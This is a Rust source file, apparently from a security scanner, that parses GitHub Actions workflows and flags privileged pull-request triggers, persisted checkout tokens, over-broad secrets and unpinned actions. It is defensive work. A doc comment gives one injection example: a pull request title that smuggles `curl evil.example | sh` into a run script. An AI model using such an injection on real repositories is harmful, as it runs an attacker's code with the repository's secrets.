//! The app's GitHub Actions workflows, read for what AISVS Appendix C warns about.
//!
//! A workflow is code that runs with the repository's credentials, and the dangerous shapes are few
//! and well known. A workflow started by `pull_request_target`, `workflow_run`, `issue_comment`, or
//! `discussion_comment` runs with the repository's secrets and a token that can write, even when a
//! stranger's pull request or comment started it, so checking out a pull request's code there hands
//! the stranger both (AC.12.1, AC.12.3). A
//! checkout that keeps its token on disk leaves it for whatever runs next in the job (AC.12.2).
//!
//! What a file cannot show is left alone rather than guessed at. Whether a job needs a person's
//! approval before it gets secrets, and whether a private repository sends secrets to pull requests
//! from forks, are repository settings. So AC.12.3 is only ever a finding here, and a clean run is
//! never credited for it.
//!
//! The files are read with tree-sitter's YAML grammar rather than a YAML crate: the established serde
//! one is archived (DESIGN, "pnpm, and a dependency not taken"), and tree-sitter is already how `sv`
//! reads code. Anything a plain reading of the file cannot settle — an anchor, an alias, a tag, a
//! second document, a parse error — leaves the file unread, and an unread workflow credits nothing.

use crate::finding::{Confidence, Finding, Location, Severity};
use crate::verified::Verified;
use std::path::Path;
use tree_sitter::{Node, Parser};

/// What reading the workflows concluded. The same three answers as every configuration check.
#[derive(Debug, Default)]
pub struct WorkflowReport {
    pub findings: Vec<Finding>,
    pub passed: Vec<Verified>,
    pub not_assessed: Vec<(String, String)>,
}

pub const FORK_CODE: &str = "config.workflow-runs-fork-code";
pub const FORK_SECRETS: &str = "config.workflow-secrets-with-fork-code";
pub const CHECKOUT_TOKEN: &str = "config.workflow-checkout-keeps-token";
pub const TOKEN_PERMISSIONS: &str = "config.workflow-token-permissions";
pub const ALL_SECRETS: &str = "config.workflow-hands-out-all-secrets";
pub const UNTRUSTED_IN_RUN: &str = "config.workflow-untrusted-text-in-run";
pub const ACTION_NOT_PINNED: &str = "config.workflow-action-not-pinned";

/// Text a stranger writes and a workflow can read: a pull request's, issue's, comment's, or
/// discussion's title and body, a branch name, a commit message, and its author's name and email.
/// GitHub's own list of untrusted input ("Security hardening for GitHub Actions"). Compared with the
/// expression lowered and its spaces taken out.
const UNTRUSTED_TEXT: &[&str] = &[
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.pull_request.head.repo.default_branch",
    "github.head_ref",
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.event.head_commit.message",
    "github.event.head_commit.author.email",
    "github.event.head_commit.author.name",
    "github.event.commits",
    "github.event.workflow_run.head_branch",
    "github.event.workflow_run.head_commit.message",
    "github.event.workflow_run.head_commit.author",
    "github.event.pages",
];

/// Triggers whose runs a stranger can start and that run with the repository's secrets and a token
/// that can write: the privileged triggers, and an issue or a discussion opened by anyone.
const SECRET_TRIGGERS: &[&str] = &["issues", "discussion"];

/// Pipelines of other kinds. While one of these is present, a clean set of GitHub workflows is not a
/// clean pipeline, because part of it was never read.
const OTHER_PIPELINES: &[&str] = &[
    ".gitlab-ci.yml",
    "Jenkinsfile",
    ".circleci/config.yml",
    "azure-pipelines.yml",
    "bitbucket-pipelines.yml",
    ".travis.yml",
    ".buildkite/pipeline.yml",
];

/// Triggers that run with the repository's secrets and a writable token when a stranger starts them:
/// a pull request from a fork, or a comment anyone can write on a public repository. The comment
/// triggers were missing, so a workflow started by `issue_comment` that checked out the pull request
/// was credited AC.12.1 (deep review H4).
///
/// Left out: `workflow_dispatch` and `repository_dispatch`, which only somebody with write access or a
/// token can start, so "a stranger started it" does not hold. Also left out: `pull_request_review`
/// and `pull_request_review_comment`, which the review proposed adding. GitHub's documentation ("Events
/// that trigger workflows", read 5 October 2026) says of both, as of `pull_request`, that "with the
/// exception of GITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a
/// forked repository", that the token is then read-only, and that they run on the pull request's merge
/// branch, where `issue_comment` runs on the default branch. They are `pull_request` started by a review,
/// and are judged as `pull_request` is (DESIGN, "The review triggers run as `pull_request` does").
const PRIVILEGED_TRIGGERS: &[&str] = &[
    "pull_request_target",
    "workflow_run",
    "issue_comment",
    "discussion_comment",
];

/// The privileged triggers, as a sentence names them: "`a`, `b`, or `c`".
fn privileged_trigger_names() -> String {
    let names: Vec<String> = PRIVILEGED_TRIGGERS
        .iter()
        .map(|t| format!("`{t}`"))
        .collect();
    match names.split_last() {
        Some((last, rest)) if !rest.is_empty() => format!("{}, or {last}", rest.join(", ")),
        _ => names.concat(),
    }
}

/// Ways a workflow names the pull request's own code rather than the repository's. Compared with the
/// text lowered and its spaces taken out, so `${{ github.head_ref }}` and `${{github.head_ref}}` match
/// alike.
const UNTRUSTED_REFS: &[&str] = &[
    "pull_request.head",
    "github.head_ref",
    "workflow_run.head",
    "refs/pull/",
    "merge_commit_sha",
];

/// Commands in a `run:` step that fetch the pull request's code without `actions/checkout`.
const UNTRUSTED_FETCHES: &[&str] = &["ghprcheckout", "refs/pull/", "pull/${{"];

/// A YAML value, as far as a workflow needs one: every scalar keeps the line it is on.
#[derive(Debug, Clone)]
enum Value {
    Scalar(String, usize),
    Seq(Vec<Value>),
    Map(Vec<(String, Value)>),
    Null,
}

impl Value {
    fn get(&self, key: &str) -> Option<&Value> {
        match self {
            Value::Map(pairs) => pairs.iter().find(|(k, _)| k == key).map(|(_, v)| v),
            _ => None,
        }
    }

    fn text(&self) -> Option<&str> {
        match self {
            Value::Scalar(s, _) => Some(s),
            _ => None,
        }
    }

    /// The line of the first scalar in this value, for a finding to point at.
    fn line(&self) -> Option<usize> {
        match self {
            Value::Scalar(_, line) => Some(*line),
            Value::Seq(items) => items.iter().find_map(Value::line),
            Value::Map(pairs) => pairs.iter().find_map(|(_, v)| v.line()),
            Value::Null => None,
        }
    }

    /// Every scalar inside this value with its line, keys left out.
    fn scalars_at<'a>(&'a self, out: &mut Vec<(&'a str, usize)>) {
        match self {
            Value::Scalar(s, line) => out.push((s, *line)),
            Value::Seq(items) => items.iter().for_each(|v| v.scalars_at(out)),
            Value::Map(pairs) => pairs.iter().for_each(|(_, v)| v.scalars_at(out)),
            Value::Null => {}
        }
    }

    /// Every scalar inside this value, keys included.
    fn scalars<'a>(&'a self, keys: bool, out: &mut Vec<&'a str>) {
        match self {
            Value::Scalar(s, _) => out.push(s),
            Value::Seq(items) => items.iter().for_each(|v| v.scalars(keys, out)),
            Value::Map(pairs) => {
                for (k, v) in pairs {
                    if keys {
                        out.push(k);
                    }
                    v.scalars(keys, out);
                }
            }
            Value::Null => {}
        }
    }
}

/// Reads one workflow file into a [`Value`], or says why it could not.
fn parse(source: &str) -> Result<Value, String> {
    let mut parser = Parser::new();
    parser
        .set_language(&tree_sitter_yaml::LANGUAGE.into())
        .map_err(|_| "the YAML grammar could not be loaded".to_owned())?;
    let tree = parser
        .parse(source, None)
        .ok_or_else(|| "the file could not be parsed".to_owned())?;
    let root = tree.root_node();
    if root.has_error() {
        return Err("the file is not YAML the grammar can read".to_owned());
    }
    let mut cursor = root.walk();
    let documents: Vec<Node> = root
        .named_children(&mut cursor)
        .filter(|n| n.kind() == "document")
        .collect();
    match documents.as_slice() {
        [] => Ok(Value::Null),
        [one] => {
            let mut cursor = one.walk();
            let content: Vec<Node> = one
                .named_children(&mut cursor)
                .filter(|n| n.kind() != "comment")
                .collect();
            match content.as_slice() {
                [] => Ok(Value::Null),
                [node] => value(*node, source),
                _ => Err("the file holds something besides one document".to_owned()),
            }
        }
        _ => Err("the file holds more than one YAML document".to_owned()),
    }
}

fn value(node: Node, source: &str) -> Result<Value, String> {
    let text = |n: Node| {
        n.utf8_text(source.as_bytes())
            .unwrap_or_default()
            .to_owned()
    };
    let line = node.start_position().row + 1;
    match node.kind() {
        "block_node" | "flow_node" => {
            let mut cursor = node.walk();
            let children: Vec<Node> = node
                .named_children(&mut cursor)
                .filter(|n| n.kind() != "comment")
                .collect();
            if children
                .iter()
                .any(|n| matches!(n.kind(), "anchor" | "tag" | "alias"))
            {
                // An alias makes one value stand for another written elsewhere, and a tag can change
                // what a value means. Following either is where a reading goes wrong quietly.
                return Err("the file uses a YAML anchor, alias, or tag".to_owned());
            }
            match children.as_slice() {
                [] => Ok(Value::Null),
                [inner] => value(*inner, source),
                _ => Err(format!("a value on line {line} could not be read")),
            }
        }
        "block_mapping" | "flow_mapping" => {
            let mut pairs = Vec::new();
            let mut cursor = node.walk();
            for pair in node.named_children(&mut cursor) {
                match pair.kind() {
                    "comment" => {}
                    "block_mapping_pair" | "flow_pair" => {
                        let key = match pair.child_by_field_name("key") {
                            Some(k) => match value(k, source)? {
                                Value::Scalar(s, _) => s,
                                _ => return Err(format!("a key on line {line} is not plain text")),
                            },
                            None => String::new(),
                        };
                        let val = match pair.child_by_field_name("value") {
                            Some(v) => value(v, source)?,
                            None => Value::Null,
                        };
                        pairs.push((key, val));
                    }
                    // A flow mapping entry with a key and no value: `{ push }`.
                    "flow_node" => {
                        if let Value::Scalar(s, _) = value(pair, source)? {
                            pairs.push((s, Value::Null));
                        }
                    }
                    other => return Err(format!("unexpected `{other}` on line {line}")),
                }
            }
            Ok(Value::Map(pairs))
        }
        "block_sequence" | "flow_sequence" => {
            let mut items = Vec::new();
            let mut cursor = node.walk();
            for item in node.named_children(&mut cursor) {
                match item.kind() {
                    "comment" => {}
                    "block_sequence_item" => {
                        let mut inner_cursor = item.walk();
                        let inner: Vec<Node> = item
                            .named_children(&mut inner_cursor)
                            .filter(|n| n.kind() != "comment")
                            .collect();
                        items.push(match inner.as_slice() {
                            [] => Value::Null,
                            [one] => value(*one, source)?,
                            _ => {
                                return Err(format!(
                                    "a list item on line {line} could not be read"
                                ));
                            }
                        });
                    }
                    _ => items.push(value(item, source)?),
                }
            }
            Ok(Value::Seq(items))
        }
        "plain_scalar" => Ok(Value::Scalar(text(node).trim().to_owned(), line)),
        "single_quote_scalar" => {
            let raw = text(node);
            let inner = raw
                .strip_prefix('\'')
                .and_then(|s| s.strip_suffix('\''))
                .unwrap_or(&raw);
            Ok(Value::Scalar(inner.replace("''", "'"), line))
        }
        "double_quote_scalar" => {
            let raw = text(node);
            let inner = raw
                .strip_prefix('"')
                .and_then(|s| s.strip_suffix('"'))
                .unwrap_or(&raw);
            Ok(Value::Scalar(
                inner.replace("\\\"", "\"").replace("\\\\", "\\"),
                line,
            ))
        }
        // `run: |` and `run: >`. Only ever searched for text, so the indicator line is harmless.
        "block_scalar" => Ok(Value::Scalar(text(node), line)),
        other => Err(format!("unexpected `{other}` on line {line}")),
    }
}

/// Lowered, with every space taken out, for comparing expressions however they were spaced.
fn squashed(text: &str) -> String {
    text.chars()
        .filter(|c| !c.is_whitespace())
        .flat_map(char::to_lowercase)
        .collect()
}

fn names_untrusted_code(text: &str) -> bool {
    let s = squashed(text);
    UNTRUSTED_REFS.iter().any(|p| s.contains(p))
}

/// The events that start a workflow: `on: push`, `on: [push, pull_request]`, or `on:` with a map.
fn triggers(workflow: &Value) -> Vec<String> {
    let Some(on) = workflow.get("on").or_else(|| workflow.get("true")) else {
        return Vec::new();
    };
    match on {
        Value::Scalar(s, _) => vec![s.clone()],
        Value::Seq(items) => items
            .iter()
            .filter_map(|v| v.text().map(str::to_owned))
            .collect(),
        Value::Map(pairs) => pairs.iter().map(|(k, _)| k.clone()).collect(),
        Value::Null => Vec::new(),
    }
}

fn is_checkout(step: &Value) -> bool {
    step.get("uses").and_then(Value::text).is_some_and(|u| {
        u.trim()
            .to_ascii_lowercase()
            .starts_with("actions/checkout@")
    })
}

/// Where a step brings the pull request's code into the job, if it does.
fn untrusted_code_at(step: &Value) -> Option<usize> {
    if is_checkout(step) {
        let with = step.get("with")?;
        for key in ["ref", "repository"] {
            if let Some(v) = with.get(key)
                && v.text().is_some_and(names_untrusted_code)
            {
                return v.line();
            }
        }
        return None;
    }
    let run = step.get("run")?;
    let script = squashed(run.text()?);
    UNTRUSTED_FETCHES
        .iter()
        .any(|p| script.contains(p))
        .then(|| run.line())
        .flatten()
}

/// Whether a job is a call to a reusable workflow that passes it every secret the caller has.
fn inherits_secrets(job: &Value) -> bool {
    job.get("secrets")
        .and_then(Value::text)
        .is_some_and(|s| s.trim() == "inherit")
}

/// Whether a value names a secret other than the job's own token.
fn names_a_secret(text: &str) -> bool {
    let s = squashed(text);
    s.match_indices("secrets.")
        .any(|(at, _)| !s[at..].starts_with("secrets.github_token"))
}

/// Whether anything in a job reads a secret other than the job's own token.
fn reads_secrets(job: &Value) -> bool {
    if inherits_secrets(job) {
        return true;
    }
    let mut all = Vec::new();
    job.scalars(false, &mut all);
    all.iter().any(|s| names_a_secret(s))
}

fn steps(job: &Value) -> &[Value] {
    match job.get("steps") {
        Some(Value::Seq(items)) => items,
        _ => &[],
    }
}

fn jobs(workflow: &Value) -> Vec<(&str, &Value)> {
    match workflow.get("jobs") {
        Some(Value::Map(pairs)) => pairs.iter().map(|(k, v)| (k.as_str(), v)).collect(),
        _ => Vec::new(),
    }
}

#[track_caller]
fn finding(
    rule_id: &str,
    title: String,
    severity: Severity,
    location: Location,
    requirement_ids: &[&str],
    cwe: &[&str],
    text: [String; 3],
) -> Finding {
    let [description, impact, fix] = text;
    crate::finding::found(Finding {
        also_reported_by: Vec::new(),
        fingerprint: String::new(),
        earlier_fingerprints: Vec::new(),
        marked_test_code: false,
        bundled_library: None,
        outranked: None,
        also_on_this_line: Vec::new(),
        rule_id: rule_id.into(),
        title,
        severity,
        confidence: Confidence::High,
        location,
        secret: None,
        requirement_ids: requirement_ids.iter().map(|s| (*s).to_owned()).collect(),
        cwe: cwe.iter().map(|s| (*s).to_owned()).collect(),
        description,
        impact,
        fix,
    })
}

fn at(file: &str, line: usize) -> Location {
    Location {
        file: file.to_owned(),
        line,
    }
}

/// Reads every workflow in `.github/workflows` and reports what it found.
pub fn check(app_dir: &Path) -> WorkflowReport {
    let mut report = WorkflowReport::default();
    let dir = app_dir.join(".github").join("workflows");
    let Ok(entries) = std::fs::read_dir(&dir) else {
        // No workflows: nothing here to read. Whether the app has a pipeline somewhere else is the
        // manifest's question (`ci-cd`), not this check's.
        return report;
    };
    let mut files: Vec<(String, std::path::PathBuf)> = entries
        .flatten()
        .map(|e| e.path())
        .filter(|p| {
            p.is_file()
                && p.extension().is_some_and(|x| {
                    x.eq_ignore_ascii_case("yml") || x.eq_ignore_ascii_case("yaml")
                })
        })
        .map(|p| {
            let name = p.file_name().unwrap_or_default().to_string_lossy();
            (format!(".github/workflows/{name}"), p)
        })
        .collect();
    files.sort();
    if files.is_empty() {
        return report;
    }

    let mut unread = Vec::new();
    let mut privileged = Vec::new();
    let mut checkouts = 0usize;
    let mut kept_token = 0usize;
    for (name, path) in &files {
        let parsed = std::fs::read_to_string(path)
            .map_err(|_| "the file could not be opened".to_owned())
            .and_then(|text| parse(&text));
        let workflow = match parsed {
            Ok(w) => w,
            Err(why) => {
                unread.push(format!("`{name}` ({why})"));
                continue;
            }
        };
        let on = triggers(&workflow);
        let fork_aware: Vec<&str> = PRIVILEGED_TRIGGERS
            .iter()
            .copied()
            .filter(|t| on.iter().any(|o| o == t))
            .collect();
        if !fork_aware.is_empty() {
            privileged.push(name.clone());
        }

        let mut fork_code_at = None;
        let mut secrets_with_fork_code_at = None;
        let mut first_kept_token = None;
        let mut kept_in_file = 0usize;
        for (_, job) in jobs(&workflow) {
            let mut job_runs_fork_code = None;
            for step in steps(job) {
                if is_checkout(step) {
                    checkouts += 1;
                    let off = step
                        .get("with")
                        .and_then(|w| w.get("persist-credentials"))
                        .and_then(Value::text)
                        .is_some_and(|v| v.trim().eq_ignore_ascii_case("false"));
                    if !off {
                        kept_in_file += 1;
                        first_kept_token = first_kept_token.or(step.line());
                    }
                }
                if !fork_aware.is_empty()
                    && let Some(line) = untrusted_code_at(step)
                {
                    job_runs_fork_code = job_runs_fork_code.or(Some(line));
                }
            }
            if let Some(line) = job_runs_fork_code {
                fork_code_at = fork_code_at.or(Some(line));
                if reads_secrets(job) {
                    secrets_with_fork_code_at = secrets_with_fork_code_at.or(Some(line));
                }
            }
        }
        kept_token += kept_in_file;
        let trigger = fork_aware.join("` and `");

        if let Some(line) = fork_code_at {
            report.findings.push(finding(
                FORK_CODE,
                format!("A workflow started by `{trigger}` runs the pull request's own code"),
                Severity::Critical,
                at(name, line),
                &["AC.12.1"],
                &["CWE-829"],
                [
                    format!(
                        "`{name}` is started by `{trigger}`, which runs with this repository's \
                         secrets and a token that can write to it even when a stranger's pull request \
                         or comment started it, and on line {line} it brings in a pull request's \
                         code."
                    ),
                    "Anybody who opens a pull request can change what runs here, and what runs \
                     here can push to the repository, publish a release, or send the secrets \
                     anywhere."
                        .into(),
                    "Build and test pull requests in a separate workflow started by `pull_request`, \
                     which gets no secrets and a read-only token. If something privileged has to \
                     follow, pass it only files that workflow produced, and treat them as data."
                        .into(),
                ],
            ));
        }
        if let Some(line) = secrets_with_fork_code_at {
            report.findings.push(finding(
                FORK_SECRETS,
                "Secrets are available to a job that runs a pull request's code".into(),
                Severity::Critical,
                at(name, line),
                &["AC.12.3"],
                &["CWE-200"],
                [
                    format!(
                        "A job in `{name}` brings in the pull request's code (line {line}) and reads \
                         this repository's secrets in the same job."
                    ),
                    "The pull request's code runs where the secrets are, so whoever wrote it can \
                     read them."
                        .into(),
                    "Keep secrets out of any job that runs code from a pull request, and put a job \
                     that needs them behind an environment that requires a person's approval."
                        .into(),
                ],
            ));
        }
        if let Some(line) = first_kept_token {
            report.findings.push(finding(
                CHECKOUT_TOKEN,
                "A checkout leaves its access token on disk for the rest of the job".into(),
                Severity::Medium,
                at(name, line),
                &["AC.12.2"],
                &["CWE-522"],
                [
                    format!(
                        "{} in `{name}` use `actions/checkout` without \
                         `persist-credentials: false`, so the token it used stays in the \
                         checked-out folder's git settings.",
                        if kept_in_file == 1 {
                            "One step".to_owned()
                        } else {
                            format!("{kept_in_file} steps")
                        }
                    ),
                    "Every later step in the job can read that token, including build scripts, \
                     test code, and packages installed from outside, and an AI coding tool's \
                     changes run there too."
                        .into(),
                    "Add `persist-credentials: false` under `with:` on each checkout step. A step \
                     that has to push can pass a token to that one command instead."
                        .into(),
                ],
            ));
        }
        token_permissions(&workflow, name, &mut report);
        all_secrets(&workflow, name, &mut report);
        untrusted_in_run(&workflow, name, &on, &mut report);
        actions_not_pinned(&workflow, name, &mut report);
    }

    let other: Vec<&str> = OTHER_PIPELINES
        .iter()
        .copied()
        .filter(|p| app_dir.join(p).exists())
        .collect();
    let read = files.len() - unread.len();
    let scope = format!(
        "{read} GitHub Actions workflow file{} in .github/workflows",
        if read == 1 { "" } else { "s" }
    );

    // What keeps a clean result from being credited, in the order an owner would fix it.
    let blocked = if !unread.is_empty() {
        Some(format!(
            "`sv` could not read {}, so a clean result for the others is not a clean pipeline.",
            unread.join(", ")
        ))
    } else if !other.is_empty() {
        Some(format!(
            "This app also has {}, which `sv` does not read, so clean GitHub workflows are not a \
             clean pipeline.",
            other
                .iter()
                .map(|p| format!("`{p}`"))
                .collect::<Vec<_>>()
                .join(", ")
        ))
    } else {
        None
    };

    // AC.12.1: credited only when nothing can start a workflow with the repository's secrets on a
    // stranger's behalf. A privileged trigger with no checkout this recognizes is not clean: an
    // artifact downloaded from the pull request's run is its code too, in another form.
    if !report.findings.iter().any(|f| f.rule_id == FORK_CODE) {
        match &blocked {
            Some(why) => report.not_assessed.push((FORK_CODE.into(), why.clone())),
            None if !privileged.is_empty() => report.not_assessed.push((
                FORK_CODE.into(),
                format!(
                    "{} {} started by one of {}, and `sv` found no step bringing in a pull request's code. \
                     That is not the same as none: a workflow can also run what it downloads from \
                     the pull request's own run, or a commit it looks up itself, which `sv` does \
                     not follow.",
                    privileged
                        .iter()
                        .map(|p| format!("`{p}`"))
                        .collect::<Vec<_>>()
                        .join(", "),
                    if privileged.len() == 1 { "is" } else { "are" },
                    privileged_trigger_names()
                ),
            )),
            None => report.passed.push(Verified::new(
                FORK_CODE,
                &["AC.12.1"],
                format!(
                    "{scope}, none started by {}; a setting that sends secrets to pull requests \
                     from forks is not in any file",
                    privileged_trigger_names()
                ),
            )),
        }
    }

    // AC.12.2: credited only when there is at least one checkout and every one turns the token off.
    // With no checkout there is nothing this reading shows.
    if kept_token == 0 {
        match &blocked {
            Some(why) => report.not_assessed.push((CHECKOUT_TOKEN.into(), why.clone())),
            None if checkouts == 0 => report.passed.push(Verified::new(
                CHECKOUT_TOKEN,
                &[],
                format!("{scope}, none of them checking out the repository"),
            )),
            None => report.passed.push(Verified::new(
                CHECKOUT_TOKEN,
                &["AC.12.2"],
                format!(
                    "{scope}: every checkout sets `persist-credentials: false`; credentials kept on \
                     the runner some other way are not in any file"
                ),
            )),
        }
    }

    // AC.12.3 turns on approvals that are repository settings, so a clean reading credits nothing.
    if !report.findings.iter().any(|f| f.rule_id == FORK_SECRETS) && blocked.is_none() {
        report.passed.push(Verified::new(
            FORK_SECRETS,
            &[],
            format!("{scope}; whether a person must approve a job before it gets secrets is a repository setting"),
        ));
    }
    report
}

/// A workflow whose token can write to everything, or that never says what its token may do.
///
/// Evidence about no requirement. AC.7.4 names `permissions:` blocks, but what it asks is that
/// changes to them get dual control and a security review, which no file shows; the block itself is
/// good practice rather than something a requirement here asks for, and is reported as that.
fn token_permissions(workflow: &Value, name: &str, report: &mut WorkflowReport) {
    let broad = |v: &Value| v.text().is_some_and(|t| t.trim() == "write-all");
    let top = workflow.get("permissions");
    let jobs = jobs(workflow);
    let unset: Vec<&str> = if top.is_some() {
        Vec::new()
    } else {
        jobs.iter()
            .filter(|(_, job)| job.get("permissions").is_none())
            .map(|(id, _)| *id)
            .collect()
    };
    let write_all = top.is_some_and(broad)
        || jobs
            .iter()
            .any(|(_, job)| job.get("permissions").is_some_and(broad));
    if unset.is_empty() && !write_all {
        return;
    }
    let line = top
        .and_then(Value::line)
        .or_else(|| workflow.get("jobs").and_then(Value::line))
        .unwrap_or(1);
    let description = if write_all {
        format!(
            "`{name}` gives its token `write-all`, so every step can change anything in the repository."
        )
    } else {
        format!(
            "`{name}` does not say what its token may do (no `permissions:` for the workflow or for \
             job{} {}), so the token gets the repository's default, which can include writing.",
            if unset.len() == 1 { "" } else { "s" },
            unset
                .iter()
                .map(|j| format!("`{j}`"))
                .collect::<Vec<_>>()
                .join(", ")
        )
    };
    report.findings.push(finding(
        TOKEN_PERMISSIONS,
        "A workflow's token may do more than the workflow needs".into(),
        Severity::Low,
        at(name, line),
        &[],
        &["CWE-250"],
        [
            description,
            "If anything in the workflow is tricked into running someone else's commands, they \
             run with whatever the token allows."
                .into(),
            "Add `permissions: contents: read` at the top of the workflow, and give a job more only \
             where it needs it."
                .into(),
        ],
    ));
}

/// A workflow that hands a job every secret, or more secrets than the one step that uses them (V13.3.2).
///
/// Only ever a finding: a workflow that hands out each secret where it is needed says nothing about
/// who else can read them, in the repository's settings or anywhere else.
fn all_secrets(workflow: &Value, name: &str, report: &mut WorkflowReport) {
    let mut ways: Vec<(usize, String)> = Vec::new();
    let mut all = Vec::new();
    workflow.scalars_at(&mut all);
    let dumped = all
        .iter()
        .find(|(s, _)| squashed(s).contains("tojson(secrets)"));
    if let Some((_, line)) = dumped {
        ways.push((
            *line,
            format!("line {line} turns every secret into one piece of text (`toJSON(secrets)`)"),
        ));
    }
    for (id, job) in jobs(workflow) {
        if inherits_secrets(job) {
            let line = job.get("secrets").and_then(Value::line).unwrap_or(1);
            ways.push((
                line,
                format!(
                    "job `{id}` passes every secret to the workflow it calls (`secrets: inherit`, \
                     line {line})"
                ),
            ));
        }
    }
    // A secret in the workflow's own `env:` reaches every step of every job. With only one step in
    // the whole file there is nobody else to reach, so that is not reported.
    let step_count: usize = jobs(workflow).iter().map(|(_, job)| steps(job).len()).sum();
    if let Some(Value::Map(env)) = workflow.get("env")
        && step_count > 1
    {
        let named: Vec<(&str, usize)> = env
            .iter()
            .filter(|(_, v)| v.text().is_some_and(names_a_secret))
            .map(|(k, v)| (k.as_str(), v.line().unwrap_or(1)))
            .collect();
        if let Some((_, line)) = named.first() {
            ways.push((
                *line,
                format!(
                    "the workflow-wide `env:` gives {} to all {step_count} steps (line {line})",
                    named
                        .iter()
                        .map(|(k, _)| format!("`{k}`"))
                        .collect::<Vec<_>>()
                        .join(", ")
                ),
            ));
        }
    }
    let Some(&(line, _)) = ways.iter().min_by_key(|(line, _)| *line) else {
        return;
    };
    report.findings.push(finding(
        ALL_SECRETS,
        "A workflow hands out more of the repository's secrets than a step needs".into(),
        if dumped.is_some() {
            Severity::High
        } else {
            Severity::Medium
        },
        at(name, line),
        &["V13.3.2"],
        &["CWE-668"],
        [
            format!(
                "In `{name}`, {}.",
                ways.iter()
                    .map(|(_, w)| w.as_str())
                    .collect::<Vec<_>>()
                    .join("; ")
            ),
            "Every step that can see a secret can leak it, including actions written by other \
             people and packages installed from outside. The more steps see each secret, the more \
             places one mistake or one bad update can send it."
                .into(),
            "Give each secret only to the step that uses it, in that step's own `env:` or `with:`. \
             Pass a reusable workflow the secrets it needs by name instead of `secrets: inherit`, \
             and never pass `toJSON(secrets)`."
                .into(),
        ],
    ));
}

/// The untrusted expressions inside a script's text: each `${{ ... }}` naming text a stranger writes.
fn untrusted_expressions(script: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut rest = script;
    while let Some(start) = rest.find("${{") {
        let after = &rest[start + 3..];
        let Some(end) = after.find("}}") else { break };
        let inside = squashed(&after[..end]);
        if UNTRUSTED_TEXT.iter().any(|u| inside.contains(u)) && !found.contains(&inside) {
            found.push(inside);
        }
        rest = &after[end + 2..];
    }
    found
}

/// A `run:` line, or `actions/github-script`'s `script:`, with text a stranger writes pasted into it.
///
/// GitHub fills in `${{ ... }}` before the shell or the script reads the line, so a pull request
/// titled `a"; curl evil.example | sh; echo "` runs that command. Only ever a finding. Cites AC.12.1
/// only when a trigger that runs with the repository's secrets on a stranger's behalf starts the
/// workflow; elsewhere it cites nothing, since the job has nothing of the repository's to give away.
fn untrusted_in_run(workflow: &Value, name: &str, on: &[String], report: &mut WorkflowReport) {
    let mut hits: Vec<(usize, String)> = Vec::new();
    for (_, job) in jobs(workflow) {
        for step in steps(job) {
            let script = step.get("run").or_else(|| {
                step.get("uses")
                    .and_then(Value::text)
                    .filter(|u| {
                        u.trim()
                            .to_ascii_lowercase()
                            .starts_with("actions/github-script@")
                    })
                    .and_then(|_| step.get("with")?.get("script"))
            });
            let Some(script) = script else { continue };
            let Some(text) = script.text() else { continue };
            for expression in untrusted_expressions(text) {
                hits.push((script.line().unwrap_or(1), expression));
            }
        }
    }
    let Some(&(line, _)) = hits.first() else {
        return;
    };
    let privileged: Vec<&str> = PRIVILEGED_TRIGGERS
        .iter()
        .chain(SECRET_TRIGGERS)
        .copied()
        .filter(|t| on.iter().any(|o| o == t))
        .collect();
    let named: Vec<String> = hits
        .iter()
        .map(|(line, e)| format!("`${{{{ {e} }}}}` (line {line})"))
        .collect();
    report.findings.push(finding(
        UNTRUSTED_IN_RUN,
        "Text a stranger writes is pasted into a workflow's commands".into(),
        if privileged.is_empty() {
            Severity::Medium
        } else {
            Severity::Critical
        },
        at(name, line),
        if privileged.is_empty() {
            &[]
        } else {
            &["AC.12.1"]
        },
        &["CWE-78"],
        [
            format!(
                "In `{name}`, {} {} put straight into a script, where it is read as commands{}.",
                named.join(", "),
                if named.len() == 1 { "is" } else { "are" },
                if privileged.is_empty() {
                    String::new()
                } else {
                    format!(
                        ", and the workflow is started by `{}`, which runs with this repository's \
                         secrets and a token that can write",
                        privileged.join("` and `")
                    )
                }
            ),
            "GitHub fills in the expression before the script runs, so whoever writes that text \
             (a pull request's title, a branch name, an issue) can end it with a quote and add \
             commands of their own, which run on the build machine with whatever the job holds."
                .into(),
            "Pass the text in through `env:` (`TITLE: ${{ github.event.pull_request.title }}`) \
             and use it in the script as a quoted variable (`\"$TITLE\"`), so it is only ever \
             read as text."
                .into(),
        ],
    ));
}

/// Whether `uses:` names a commit: 40 hexadecimal characters after the `@`.
fn pinned_to_commit(reference: &str) -> bool {
    reference.len() == 40 && reference.chars().all(|c| c.is_ascii_hexdigit())
}

/// Actions from outside GitHub's own organizations named by a tag or a branch rather than a commit.
///
/// A tag can be moved to other code at any time by whoever controls the action, and that code then
/// runs in every job that uses it, with whatever the job holds. Evidence about no requirement here:
/// none asks for commit pinning, so it is reported as good practice, as the token's permissions are.
fn actions_not_pinned(workflow: &Value, name: &str, report: &mut WorkflowReport) {
    let mut loose: Vec<(usize, String)> = Vec::new();
    let mut consider = |uses: &Value| {
        let Some(text) = uses.text() else { return };
        let text = text.trim();
        // A container image named by its digest is pinned in its own way; `docker://alpine@sha256:...`
        // has an `@` too. A local action (`./path`) has none, and stops at the split below.
        if text.starts_with("docker://") {
            return;
        }
        let Some((action, reference)) = text.split_once('@') else {
            return;
        };
        let owner = action.split('/').next().unwrap_or("").to_ascii_lowercase();
        if matches!(owner.as_str(), "actions" | "github") || pinned_to_commit(reference) {
            return;
        }
        if !loose.iter().any(|(_, t)| t == text) {
            loose.push((uses.line().unwrap_or(1), text.to_owned()));
        }
    };
    for (_, job) in jobs(workflow) {
        if let Some(uses) = job.get("uses") {
            consider(uses);
        }
        for step in steps(job) {
            if let Some(uses) = step.get("uses") {
                consider(uses);
            }
        }
    }
    let Some(&(line, _)) = loose.first() else {
        return;
    };
    report.findings.push(finding(
        ACTION_NOT_PINNED,
        "A workflow uses someone else's action by a name that can be moved".into(),
        Severity::Low,
        at(name, line),
        &[],
        &["CWE-829"],
        [
            format!(
                "`{name}` uses {} by a tag or a branch rather than a commit.",
                loose
                    .iter()
                    .map(|(line, t)| format!("`{t}` (line {line})"))
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
            "Whoever controls that action can point the tag at different code, and the next run \
